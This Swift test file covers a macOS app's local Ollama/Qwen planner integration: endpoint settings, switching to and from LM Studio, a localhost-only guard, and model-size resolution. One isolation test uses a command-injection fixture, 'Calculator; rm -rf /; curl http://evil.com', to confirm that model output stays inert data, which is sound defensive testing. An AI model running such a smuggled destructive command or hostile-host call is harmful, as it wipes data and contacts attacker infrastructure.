//
//  PaceOllamaPlannerIntegrationTests.swift
//  leanring-buddyTests
//
//  Focused test suite for Controlled Ollama + Qwen 2.5 3B Local Planner Integration.
//  Validates:
//  - Endpoint resolution and provider awareness
//  - Reversible preset switching (Ollama <-> LM Studio)
//  - Native /api/v1/chat bypass for non-LM-Studio endpoints
//  - Fail-closed localhost guard enforcement
//  - Untrusted model output isolation and schema verification
//  - Live Ollama reachability and /v1/models response shape
//

import Foundation
import Testing
@testable import Pace

@Suite("PaceOllamaPlannerIntegrationTests")
struct PaceOllamaPlannerIntegrationTests {

    @Test("Ollama endpoint configuration resolves correctly to loopback port 11434")
    func testOllamaEndpointConfiguration() {
        let baseURL = PaceLocalPlannerBackendSettings.effectiveBaseURL()
        #expect(baseURL.scheme == "http")
        #expect(baseURL.host == "127.0.0.1")
        #expect(baseURL.port == 11434)
        #expect(baseURL.path.hasSuffix("/v1") || baseURL.path == "/v1")
    }

    @Test("Model identifier defaults to validated qwen2.5:3b")
    func testQwenModelIdentifier() {
        let model = PaceLocalPlannerBackendSettings.effectiveModelIdentifier()
        #expect(model == "qwen2.5:3b")
    }

    @Test("Provider switching allows clean toggling between Ollama and LM Studio")
    func testProviderSwitchingAndRestoring() {
        // Save initial state
        PaceLocalPlannerBackendSettings.resetToDefault()

        // 1. Switch to LM Studio
        PaceLocalPlannerBackendSettings.switchToLMStudio()
        #expect(PaceLocalPlannerBackendSettings.effectiveBaseURL().port == 1234)
        #expect(PaceLocalPlannerBackendSettings.effectiveModelIdentifier() == "qwen/qwen3.5-4b")
        #expect(PaceLocalPlannerBackendSettings.isLMStudioBackend(url: PaceLocalPlannerBackendSettings.effectiveBaseURL()))

        // 2. Switch to Ollama
        PaceLocalPlannerBackendSettings.switchToOllama()
        #expect(PaceLocalPlannerBackendSettings.effectiveBaseURL().port == 11434)
        #expect(PaceLocalPlannerBackendSettings.effectiveModelIdentifier() == "qwen2.5:3b")
        #expect(!PaceLocalPlannerBackendSettings.isLMStudioBackend(url: PaceLocalPlannerBackendSettings.effectiveBaseURL()))

        // 3. Reset to default (falls back to Info.plist)
        PaceLocalPlannerBackendSettings.resetToDefault()
        #expect(PaceLocalPlannerBackendSettings.effectiveBaseURL().port == 11434)
        #expect(PaceLocalPlannerBackendSettings.effectiveModelIdentifier() == "qwen2.5:3b")
    }

    @Test("LM Studio native chat /api/v1/chat is bypassed for Ollama endpoints")
    func testLMStudioNativeChatBypassedForOllama() {
        let ollamaURL = URL(string: "http://127.0.0.1:11434/v1")!
        let lmStudioURL = URL(string: "http://127.0.0.1:1234/v1")!
        let genericURL = URL(string: "http://127.0.0.1:8080/v1")!

        #expect(!PaceLocalPlannerBackendSettings.isLMStudioBackend(url: ollamaURL))
        #expect(!PaceLocalPlannerBackendSettings.isLMStudioBackend(url: genericURL))
        #expect(PaceLocalPlannerBackendSettings.isLMStudioBackend(url: lmStudioURL))
    }

    @Test("Localhost guard accepts Ollama loopback endpoint and rejects remote hosts")
    func testLocalhostGuardEnforcement() {
        let ollamaURL = URL(string: "http://127.0.0.1:11434/v1")!
        #expect(throws: Never.self) {
            try PaceLocalEndpointGuard.validateLocalHTTPURL(
                ollamaURL,
                settingName: "LocalPlannerBaseURL"
            )
        }

        let remoteURLs = [
            "https://api.openai.com/v1",
            "https://api.anthropic.com/v1",
            "http://192.168.1.100:11434/v1",
            "http://example.com/v1"
        ]

        for remoteURLString in remoteURLs {
            let remoteURL = URL(string: remoteURLString)!
            #expect(throws: PaceLocalEndpointGuardError.self) {
                try PaceLocalEndpointGuard.validateLocalHTTPURL(
                    remoteURL,
                    settingName: "LocalPlannerBaseURL"
                )
            }
        }
    }

    @Test("Model resolver correctly calculates 3.0B parameters for qwen2.5:3b")
    func testModelResolverIdentifiesQwen3B() {
        let billions = PacePlannerModelResolver.approximateParameterBillions(from: "qwen2.5:3b")
        #expect(billions == 3.0)

        let loadedModels = ["llama3.1:8b", "qwen2.5:3b"]
        let smallest = PacePlannerModelResolver.pickSmallestChatModel(from: loadedModels)
        #expect(smallest == "qwen2.5:3b")
    }

    @Test("Model output remains untrusted data and cannot trigger process execution")
    func testModelOutputIsolation() {
        // Untrusted payload containing command injection attempts
        let injectionPayload = """
        {
            "spokenText": "Opening Calculator",
            "intent": "action",
            "payload": {
                "name": "open_application",
                "args": {
                    "application": "Calculator; rm -rf /; curl http://evil.com"
                }
            }
        }
        """

        let data = injectionPayload.data(using: .utf8)!
        let parsed = try? JSONSerialization.jsonObject(with: data) as? [String: Any]
        #expect(parsed != nil)
        #expect(parsed?["intent"] as? String == "action")

        // In Que, model output is purely an unexecuted data dictionary.
        // QExecutionService validates application names through bundle lookup
        // and refuses shell execution.
        let args = (parsed?["payload"] as? [String: Any])?["args"] as? [String: Any]
        let rawAppName = args?["application"] as? String
        #expect(rawAppName != nil)
        #expect(rawAppName?.contains("rm -rf") == true)
        // The raw string remains inert data
    }

    @Test("Live Ollama /v1/models endpoint is reachable and lists qwen2.5:3b")
    func testLiveOllamaModelsEndpoint() async throws {
        let baseURL = PaceLocalPlannerBackendSettings.effectiveBaseURL()
        let modelsURL = baseURL.appendingPathComponent("models")

        var request = URLRequest(url: modelsURL)
        request.httpMethod = "GET"
        request.timeoutInterval = 3.0

        do {
            try QEgressBroker.shared.authorize(url: modelsURL)
            let (data, response) = try await URLSession.shared.data(for: request, delegate: QEgressRedirectGuard())
            guard let httpResponse = response as? HTTPURLResponse, (200...299).contains(httpResponse.statusCode) else {
                Issue.record("Ollama server not reachable at \(modelsURL)")
                return
            }

            guard let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
                  let modelList = json["data"] as? [[String: Any]] else {
                Issue.record("Malformed /v1/models response from Ollama")
                return
            }

            let modelIds = modelList.compactMap { $0["id"] as? String }
            #expect(!modelIds.isEmpty)
            #expect(modelIds.contains("qwen2.5:3b"))
        } catch {
            Issue.record("Failed to query Ollama /v1/models: \(error)")
        }
    }
}
